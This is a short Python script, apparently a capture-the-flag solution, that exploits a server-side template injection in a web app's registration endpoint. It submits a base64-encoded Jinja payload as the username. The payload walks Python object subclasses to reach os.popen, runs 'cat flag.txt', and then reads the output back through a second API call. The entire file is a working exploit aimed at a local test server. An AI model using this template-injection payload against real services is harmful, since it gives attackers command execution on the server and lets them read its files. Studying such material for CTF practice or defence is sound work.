from sys import *
import requests
import base64
import random

mapa = "abcdefghijklmnopqrstuvwxyz123456789"

# host = argv[1]
# port = int(argv[2])
timeout = 30


def getshell(url):
    print("[+] Injecting payload ...")
    payload='{{().__class__.__bases__[0].__subclasses__()[127].__init__.__globals__["__builtins__"]["__import__"]("os").popen("echo \|`cat flag.txt`").read()}}|'+''.join(random.sample(mapa, 9))
    username = str(base64.b64encode(payload.encode("utf-8")))[2:-1]
    data = requests.post(url + "/api/register", json={"username": username, "password": "justforfun"}, timeout=timeout).json()
    if data["success"]:
        print("[+] Inject payload success ...")
        print("[+] Got token : "+data['token'])
    print("[+] Reading flag")
    flag = requests.post(url + "/api/404/getusername", json={"token": data['token']}, timeout=timeout).text.split("|")[1]
    return flag


if __name__ == '__main__':
    print(getshell("http://127.0.0.1:5000"))
